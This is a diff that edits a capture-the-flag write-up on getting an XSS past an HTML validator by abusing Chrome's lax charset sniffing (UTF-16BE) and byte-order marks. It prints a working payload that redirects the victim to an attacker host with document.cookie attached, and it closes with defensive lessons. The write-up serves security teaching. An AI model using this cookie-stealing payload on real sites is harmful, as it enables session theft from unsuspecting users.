@@ -9,9 +9,10 @@ text.  Here, the challenge is to submit a comment that passes all checks of the
 deployed HTML validator and at the same time triggers XSS on the
 administrator's end to exfiltrate a secret flag cookie.
 
-Interestingly, there is a shortcut to solve this challenge. Instead of exploiting
-weaknesses in the HTML parser itself, we can take advantage of Google Chrome's
-lax charset sniffing to simply bypass parts the validation process.
+Interestingly, there is a shortcut to solve this challenge. Instead of
+exploiting weaknesses in the HTML parser itself, we can take advantage of
+Google Chrome's lax charset sniffing to simply bypass parts the validation
+process.
 
 ## The HTML validator
 
@@ -30,14 +31,14 @@ ensure that the supplied HTML is safe:
 One possible attack approach here is to examine the parser's handling of
 duplicate attributes and attributes that are written in mixed case or
 interspersed with unexpected Unicode glyphs. Other ideas include supplying an
-excessive amount of attributes or using ambiguous formatting -  e.g. by mixing
+excessive amount of attributes or using ambiguous formatting – e.g. by mixing
 different types of quotes, or by finding a character that the application's
 parser interprets as whitespace while the browser sees it as part of an
 identifier.
 
 ## A different approach: Charset sniffing
 
-But luckily we don't need to examine the parser's implementation to solve the
+But luckily we don't need to examine the parser implementation to solve the
 challenge. Instead, we take advantage of the fact that the site is served as
 `text/html`, but lacks a charset declaration. In such a case, browsers employ
 different heuristics to *guess* the intended charset. But while convenient,
@@ -61,51 +62,60 @@ The format of our comment looks like this:
 
     \x11x\x12x\x13x\x14x\x15x\x16x\x17x\x18x\x19x<a href="http:$payload">foo</a>
 
-Any angle brackets that appear inside the `href` attribute are parsed by the
-validator as part of the value while the browser sees the document in UTF-16BE
-and doesn't recognize the `<a>` tag at all. At `$payload` we can then simply
-inject HTML code in UTF-16BE. That is, we just need to pad a standard
-ASCII-based payload with null bytes and make sure it doesn't interfere with the
-double quotes of the original tag. To exfiltrate the cookie we then just issue
-a redirect to an attacker-controlled domain with the cookie attached.
+This comment is validated by the application in UTF-8 but displayed in the
+browser in UTF-16BE. So, any angle brackets and tags that appear inside the
+`href` attribute value would be considered secure by the validator, while the
+browser doesn't recognize the `<a>` tag in the fist place. At `$payload` we can
+then simply inject arbitrary HTML code in UTF-16BE. That is, if we have an
+ASCII-based payload, we just need to pad it with null bytes and make sure it
+doesn't interfere with the double quotes of the original tag. To exfiltrate the
+flag, we then just issue a redirect to an attacker-controlled domain with the
+cookie attached.
 
 So, the final URL-encoded sequence could look like this:
 
     %11x%12x%13x%14x%15x%16x%17x%18x%19x%3Ca%20href%3D%22http%3A%00<%00a%00 %00h%00r%00e%00f%00=%00j%00a%00v%00a%00s%00c%00r%00i%00p%00t%00:%00l%00o%00c%00a%00t%00i%00o%00n%00=%00'%00h%00t%00t%00p%00s%00:%00/%00/%00a%00t%00t%00a%00c%00k%00e%00r%00.%00s%00i%00t%00e%00/%00'%00%%002%00B%00d%00o%00c%00u%00m%00e%00n%00t%00.%00c%00o%00o%00k%00i%00e%00>%00f%00o%00o%00<%00/%00a%00>%22%3e
 
-With this payload, the following flag will be sent to `https://attacker.example/`:
+For readability, this is the sequence again with non-printable characters
+replaces with spaces:
+
+     x x x x x x x x x <a href="http: < a   h r e f = j a v a s c r i p t : l o c a t i o n = ' h t t p s : / / a t t a c k e r . s i t e / ' + d o c u m e n t . c o o k i e > f o o < / a >">
+
+With that payload, we will receive the following flag at
+`https://attacker.example/`:
 
     CTF{i_HoPe_YoU_fOunD_tHe_IntEndeD_SolUTioN_tHis_Time}
 
 It's worth noting that not all browsers perform the same lax charset sniffing
-as Google Chrome does - e.g., the trick wouldn't work in Firefox. But
+as Google Chrome does – e.g., the trick wouldn't work in Firefox. But
 fortunately, in this challenge the admin bot is implemented as a headless
 instance of Google Chrome.
 
 ## Another idea: Byte order marks
 
 Curiously, the application almost fell for a different trap that would even
-have defeated an explicit charset declaration: An attacker who controls the
+have defeated an explicit charset declaration. An attacker who controls the
 first bytes in a document can inject a BOM (byte order mark) to override the
-specified charset - even if it originates from a header declaration.
+specified charset – even if it [originates from a header declaration](https://www.w3.org/International/questions/qa-byte-order-mark):
 
 > Changes introduced with HTML5 mean that the byte-order mark overrides any
 encoding declaration in the HTTP header when detecting the encoding of an HTML
 page.
 
-[(Source)](https://www.w3.org/International/questions/qa-byte-order-mark)
-
-The BOM for UTF-16BE is `\xFE\xFF`, so this document is encoded in UTF-16BE
+The BOM for UTF-16BE is `\xFE\xFF`, so this document is encoded in UTF-16BE,
 despite being declared as UTF-8:
 
     data:text/html;charset=utf-8,%FE%FFfoo
 
-But unfortunately, this method doesn't work in the challenge because BOMs aren't
-preserved by the application, but converted (e.g. `\xFF` to `\xEF\xBF\xBD`).
+But unfortunately, this technique doesn't work in the challenge because BOMs
+aren't preserved by the application. E.g., `\xFF` is converted to
+`\xEF\xBF\xBD`.
 
 ## Lessons learned
 
 Web applications should always declare a charset explicitly and not rely on
-automated detection by browsers. The different charset sniffing techniques make
-it hard to predict browser behavior. Also, an attacker should never be able to
-control the first few bytes in a document.
+automated detection by browsers. This is because the different charset sniffing
+techniques make it hard to predict browser behavior. Also, an attacker should
+not be able to control the first few bytes in a document. Depending on the
+implementation, that otherwise facilitates charset and content-type sniffing
+attacks.
